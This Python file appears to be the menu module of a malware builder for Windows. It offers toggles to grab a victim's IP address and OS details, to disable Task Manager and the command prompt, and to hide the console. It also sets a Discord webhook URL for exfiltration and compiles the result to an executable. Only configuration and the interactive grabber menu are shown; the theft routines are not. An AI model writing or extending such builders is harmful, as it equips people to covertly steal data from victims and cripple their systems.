import sys
sys.path.insert(0, "..\\..\\")
from modules.helper import *

class script:
    debug = False

    class grabber:
        ip = False
        os = False
    
    class payload:
        disable_taskmgr = False
        disable_cmd = False
        show_msgbox = False
    
    class properties:
        name = "script"
        webhook_url = "https://discord.com/api/webhooks/"
        convert2exe = True
        icon = ""
        size = 0
        show_console = False   
class builder:
    libraries = []
    
    class grab_ip:
        libraries = [
            'socket'
        ]
    
    class grab_os:
        libraries = [
            'socket',
            'os'
        ]

# Local tools
def print_progress(phase:int, spaces:int = 15):
    # 1. Grabber
    # 2. Payload
    # 3. Properties
    # 4. Compile
    if phase == 1:
        print(" " * spaces + terminal.color + "[ " + terminal.true + "Grabbers >" + terminal.false + " Payloads > Properties > Compile" + terminal.color + " ]\n" )
    elif phase == 2:
        print(" " * spaces + terminal.color + "[ " + terminal.true + "Grabbers > Payloads >" + terminal.false + " Properties > Compile" + terminal.color + " ]\n" )
    elif phase == 3:
        print(" " * spaces + terminal.color + "[ " + terminal.true + "Grabbers > Payloads > Properties >" + terminal.false + " Compile" + terminal.color + " ]\n" )
    elif phase == 4:
        print(" " * spaces + terminal.color + "[ " + terminal.true + "Grabbers > Payloads > Properties >" + terminal.false + " Compile" + terminal.color + " ]\n" )
    else:
        print(" " * spaces + terminal.color + "[ " + terminal.false + "Grabbers > Payloads > Properties > Compile" + terminal.color + " ]")

def grabber():
    banner.grabber.grabber()
    print_progress(1)
    print(" " * 15 + terminal.color + "1. Grab IP Address       : " + highlight_boolean(script.grabber.ip))
    print(" " * 15 + terminal.color + "2. Grab OS Information   : " + highlight_boolean(script.grabber.os))
    print(" " * 15 + terminal.color + "99. Next")
    print(" " * 15 + terminal.color + "100. Return\n")
    option = input("[>] Select an option to modify: ")
    if option == "":
        error("Select an option.", grabber)
    elif not option.isnumeric():
        error("Option is not a number", grabber)
    elif int(option) == 1:
        script.grabber.ip = not script.grabber.ip
        cls()
        grabber()
    elif int(option) == 2:
        script.grabber.os = not script.grabber.os
        cls()
        grabber()
    elif int(option) == 100:
        return

grabber()